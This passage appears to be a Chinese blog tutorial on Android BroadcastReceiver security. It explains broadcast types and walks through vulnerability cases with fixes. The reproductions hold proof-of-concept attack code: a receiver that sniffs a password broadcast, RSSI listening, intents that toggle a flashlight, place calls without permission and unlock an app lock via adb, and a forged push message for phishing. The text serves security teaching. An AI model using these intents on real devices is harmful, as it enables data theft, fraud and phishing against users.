<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">系统操作	action</span><br><span class="line">监听网络变化	android.net.conn.CONNECTIVITY_CHANGE</span><br><span class="line">关闭或打开飞行模式	Intent.ACTION_AIRPLANE_MODE_CHANGED</span><br><span class="line">充电时或电量发生变化	Intent.ACTION_BATTERY_CHANGED</span><br><span class="line">电池电量低	Intent.ACTION_BATTERY_LOW</span><br><span class="line">电池电量充足（即从电量低变化到饱满时会发出广播	Intent.ACTION_BATTERY_OKAY</span><br><span class="line">系统启动完成后(仅广播一次)	Intent.ACTION_BOOT_COMPLETED</span><br><span class="line">按下照相时的拍照按键(硬件按键)时	Intent.ACTION_CAMERA_BUTTON</span><br><span class="line">屏幕锁屏	Intent.ACTION_CLOSE_SYSTEM_DIALOGS</span><br><span class="line">设备当前设置被改变时(界面语言、设备方向等)	Intent.ACTION_CONFIGURATION_CHANGED</span><br><span class="line">插入耳机时	Intent.ACTION_HEADSET_PLUG</span><br><span class="line">未正确移除SD卡但已取出来时(正确移除方法:设置--SD卡和设备内存--卸载SD卡)	Intent.ACTION_MEDIA_BAD_REMOVAL</span><br><span class="line">插入外部储存装置（如SD卡）	Intent.ACTION_MEDIA_CHECKING</span><br><span class="line">成功安装APK	Intent.ACTION_PACKAGE_ADDED</span><br><span class="line">成功删除APK	Intent.ACTION_PACKAGE_REMOVED</span><br><span class="line">重启设备	Intent.ACTION_REBOOT</span><br><span class="line">屏幕被关闭	Intent.ACTION_SCREEN_OFF</span><br><span class="line">屏幕被打开	Intent.ACTION_SCREEN_ON</span><br><span class="line">关闭系统时	Intent.ACTION_SHUTDOWN</span><br><span class="line">重启设备	Intent.ACTION_REBOOT</span><br><span class="line">注：当使用系统广播是，只需要在注册广播接收者时定义相关的action即可，并不需要手动发送广播，当系统有相关操作时会自动进行系统广播</span><br></pre></td></tr></table></figure>

<p><strong>有序广播：</strong></p>
<p>发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）按照Priority属性值从大-小排序</span><br><span class="line">（2）Priority属性相同者，动态注册的广播优先</span><br></pre></td></tr></table></figure>

<p>特点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）接收广播按顺序接收</span><br><span class="line">（<span class="number">2</span>）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法</span><br><span class="line">（<span class="number">3</span>）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播</span><br></pre></td></tr></table></figure>

<p>具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendOrderedBroadcast(intent,<span class="literal">null</span>); <span class="comment">//参数1：接收的Intent 参数2：与权限相关字符串，一般为null</span></span><br></pre></td></tr></table></figure>

<p><strong>App应用内广播（Local Broadcast）：本地广播</strong></p>
<p>产生的原因：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由于Android中的广播可以跨App直接通信（exported对于有intent-filter情况下默认值为<span class="literal">true</span>）</span><br><span class="line">导致可能会出现的问题：</span><br><span class="line">	（<span class="number">1</span>）其他App针对性发出与当前App intent-filter相匹配的广播，由此导致当前App不断接收广播并处理</span><br><span class="line">	（<span class="number">2</span>）其他App注册与当前App一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题</span><br><span class="line">解决方案：</span><br><span class="line">使用App应用内广播（Local Broadcast）</span><br><span class="line">	(<span class="number">1</span>)App应用内广播壳理解为一种局部广播，广播的发送者和接收者都同属于一个App</span><br><span class="line">	(<span class="number">2</span>)相比于全局广播（普通广播），App应用内广播优势体现在：安全性高和效率高</span><br></pre></td></tr></table></figure>

<p>实现步骤：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>：</span><br><span class="line">将全局广播设置为局部广播</span><br><span class="line">（<span class="number">1</span>）注册广播是将exported属性设置为<span class="literal">false</span>，使得非本App内部发出的此广播不被接收</span><br><span class="line">（<span class="number">2</span>）在广播的发送和接收时，增设相应权限permission，用于权限验证</span><br><span class="line">（<span class="number">3</span>）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中</span><br><span class="line">通过intent.setPackage(packageName)指定包名</span><br><span class="line"></span><br><span class="line">方法<span class="number">2</span>：</span><br><span class="line">	使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。</span><br><span class="line">注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册</span><br></pre></td></tr></table></figure>

<p>方法2的具体实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册应用内广播接收器</span></span><br><span class="line"><span class="comment">//步骤1：实例化BroadcastReceiver子类 &amp; IntentFilter mBroadcastReceiver </span></span><br><span class="line">mBroadcastReceiver = <span class="keyword">new</span> <span class="title class_">mBroadcastReceiver</span>(); </span><br><span class="line"><span class="type">IntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤2：实例化LocalBroadcastManager的实例</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤3：设置接收广播的类型 </span></span><br><span class="line">intentFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册 </span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消注册应用内广播接收器</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送应用内广播</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<p>这里我们就完成了开发人员手动完成部分，就成功实现了Android的广播机制，后续就是系统自动完成了</p>
<p>最后我们关注一些不同注册方式的广播接收器回调onReceive()中的context返回值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于静态注册（全局+应用内广播），回调onReceive(context,intent)中的context返回值是：ReceiverRestrictedContext</span><br><span class="line">对于全局广播的动态注册，回调onReceive(context, intent)中的context返回值是：Activity Context；</span><br><span class="line">对于应用内广播的动态注册（LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Application Context</span><br><span class="line">对于应用内广播的动态注册（非LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Activity Context</span><br></pre></td></tr></table></figure>

<h3 id="2-Broadcast-Reciver漏洞的种类和危害"><a href="#2-Broadcast-Reciver漏洞的种类和危害" class="headerlink" title="2.Broadcast Reciver漏洞的种类和危害"></a>2.Broadcast Reciver漏洞的种类和危害</h3><p>Broadcast Reciver漏洞大致可以分为：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/8.png" alt="image-20210912155436267"></p>
<p>Broadcast Reciver漏洞的危害：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BroadcastReceiver是四大组件之一，这个组件涉及：广播发送者和广播接收者，这里的广播实际上指的是intent当发送一个广播是，系统会将发送的广播(intent)与系统中所有注册的符合条件的接IntentFilter进行匹配，匹配成功，则执行相应的onReceive函数</span><br><span class="line">发送广播时，如果处理不当，恶意应用便可以嗅探，拦截广播，致使敏感数据泄露，接收广播时处理不当，便会导致拒绝服务攻击、伪造消息、越权操作等</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/9.png" alt="image-20210912155436267"></p>
<h2 id="三、Broadcast-Reciver漏洞原理分析和复现"><a href="#三、Broadcast-Reciver漏洞原理分析和复现" class="headerlink" title="三、Broadcast Reciver漏洞原理分析和复现"></a>三、Broadcast Reciver漏洞原理分析和复现</h2><h3 id="1-敏感信息泄漏漏洞"><a href="#1-敏感信息泄漏漏洞" class="headerlink" title="1.敏感信息泄漏漏洞"></a>1.敏感信息泄漏漏洞</h3><h4 id="（1）原理介绍"><a href="#（1）原理介绍" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：</p>
<p>我们发现一个目标程序段代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过分析得出，该程序通过intent隐式传递，并通过action匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样我们可以编写攻击代码获取敏感数据信息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以通过广播获取该程序的密码</p>
<p><strong>修复：</strong></p>
<p>我们尝试采用本地广播的方式，这样程序发出的广播就只能被app自身广播接收器接收</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;my-sensitive-event&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;event&quot;</span>,<span class="string">&quot;this is a test event&quot;</span>);</span><br><span class="line">LocalBroadcastManager.getInstance(<span class="built_in">this</span>).sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<p>案例2：<a target="_blank" rel="noopener" href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)</a></p>
<p>漏洞详情：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	Android操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号</span><br><span class="line">的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android <span class="number">9</span>之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED</span><br><span class="line">	当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为WiFi RTT特征是Android <span class="number">9</span>中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，</span><br><span class="line">在不需要通知用户，不需要其他权限的情况下就可以获取信息</span><br><span class="line">	存在的安全问题：</span><br><span class="line">	（<span class="number">1</span>）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）</span><br><span class="line">	（<span class="number">2</span>）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();        </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    ….</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>测试步骤：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）安装Broadcast Monitor app；</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）将手机设置为飞行模式；</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）进入房间；</span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>）关掉飞行模式，以触发RSSI广播；</span><br><span class="line"></span><br><span class="line">（<span class="number">5</span>）从以下广播中获取RSSI值：</span><br><span class="line">	android.net.wifi.RSSI_CHANGE – newRssi value</span><br><span class="line">	android.net.wifi.STATE_CHANGE – networkInfo / RSSI</span><br><span class="line"></span><br><span class="line">（<span class="number">6</span>）重复步骤<span class="number">3</span>-<span class="number">4</span>。</span><br></pre></td></tr></table></figure>

<p>我们可以利用广播接收者获取广播中的敏感信息RSSI值</p>
<h3 id="2-权限绕过漏洞"><a href="#2-权限绕过漏洞" class="headerlink" title="2.权限绕过漏洞"></a>2.权限绕过漏洞</h3><h4 id="（1）原理介绍-1"><a href="#（1）原理介绍-1" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过&lt;receiver&gt;标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">小米MIUI漏洞可能导致硬件资源消耗</a></p>
<p>漏洞详情：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗</span><br></pre></td></tr></table></figure>

<p>漏洞攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<p>我们这里就是通过intent隐私传递，发送广播，然后匹配小米应用中的action，这样就可以打开或广播手电筒，从而利用这个漏洞，导致系统电源迅速消耗</p>
<p><strong>修复：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">三种方法：</span><br><span class="line"><span class="number">1.</span> 在AndroidManifest.xml中，将TorchService申明为export=<span class="string">&quot;false&quot;</span>的；</span><br><span class="line"><span class="number">2.</span> 在AndroidManifest.xml中，申明一个私有权限，级别为signature，并为TorchService申明需要这个权限；</span><br><span class="line"><span class="number">3.</span> 在TorchService的实现代码中，检查Intent的来源是否Stk.apk自身。</span><br></pre></td></tr></table></figure>

<p>案例2：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">酷派最安全手机s6拨打电话权限绕过</a></p>
<p>漏洞详情：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>

<p>通过intent启动外部电话应用，匹配action，并授权标志位，这样就可以不用获取权限，就可以打电话</p>
<p>修复：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）使用本地广播</span><br><span class="line">（2）对广播的action进行判别</span><br></pre></td></tr></table></figure>

<p>案例3：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">酷派最安全手机s6程序锁绕过</a></p>
<p>漏洞详情：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的</span><br></pre></td></tr></table></figure>

<p>漏洞测试：</p>
<p>  简单测试方法用adb shell 发送广播，用来解锁  </p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/10.png" alt="image-20210912155436267"></p>
<p>然后使用命令行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d <span class="keyword">package</span>:com.wumii.android.mimi</span><br></pre></td></tr></table></figure>

<p>就可以成功解锁：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/11.png" alt="image-20210912155436267"></p>
<p><strong>修复：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势：</span><br><span class="line"><span class="number">1.</span>不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。</span><br><span class="line"><span class="number">2.</span>不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。</span><br><span class="line"><span class="number">3.</span>它比系统的全局广播更高效。</span><br></pre></td></tr></table></figure>

<h3 id="3-消息伪造"><a href="#3-消息伪造" class="headerlink" title="3.消息伪造"></a>3.消息伪造</h3><h4 id="（1）漏洞介绍"><a href="#（1）漏洞介绍" class="headerlink" title="（1）漏洞介绍"></a>（1）漏洞介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一</a></p>
<p>漏洞描述：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。</span><br><span class="line">   存在漏洞的组件是：com.baidu.android.pushservice.action.MESSAGE</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">  	i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)；</span><br><span class="line">      <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">      <span class="keyword">try</span> &#123; </span><br><span class="line">      	<span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"> 	<span class="comment">//1. phishing</span></span><br><span class="line">          <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">      	jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;百度云盘【漏洞你中奖了！】&quot;</span>);</span><br><span class="line">      	jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      	<span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">      	jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">      	<span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();       	</span><br><span class="line">      	customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      	customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">      	customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      	customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);  	</span><br><span class="line">      	jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);   	</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">	